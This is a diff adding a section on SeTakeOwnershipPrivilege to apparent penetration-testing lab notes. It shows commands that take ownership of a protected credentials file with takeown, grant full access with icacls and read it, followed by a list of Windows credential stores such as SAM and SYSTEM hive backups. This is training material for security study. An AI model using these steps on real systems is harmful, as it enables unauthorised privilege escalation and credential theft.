@@ -79,3 +79,60 @@ Import-Module .\psgetsys.ps1
 
 ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
 ```
+
+## SeTakeOwnershipPrivilege
+- SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.
+- This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor.
+
+### check 
+```powershell
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                              State
+============================= ======================================== =======
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+```
+
+### Take onwership 
+
+```powershell
+# check ownership of a file
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+cmd /c dir /q 'C:\Department Shares\Private\IT'
+
+# check owenrship of a user in AD
+$user = Get-ADUser -Identity "username" -Properties * # Replace 'username' with the actual username
+$objectGUID = $user.ObjectGUID
+$ADsPath = "LDAP://<GUID=$objectGUID>"
+$userObject = [ADSI]$ADsPath
+$owner = $userObject.psbase.ObjectSecurity.GetOwner([System.Security.Principal.NTAccount])
+Write-Output "Owner: $owner"
+
+
+
+# Taking Ownership of the File
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+
+# Modifying the File ACL
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+
+# Reading the File
+cat 'C:\Department Shares\Private\IT\cred.txt'
+
+```
+
+### Files of Interest
+```
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
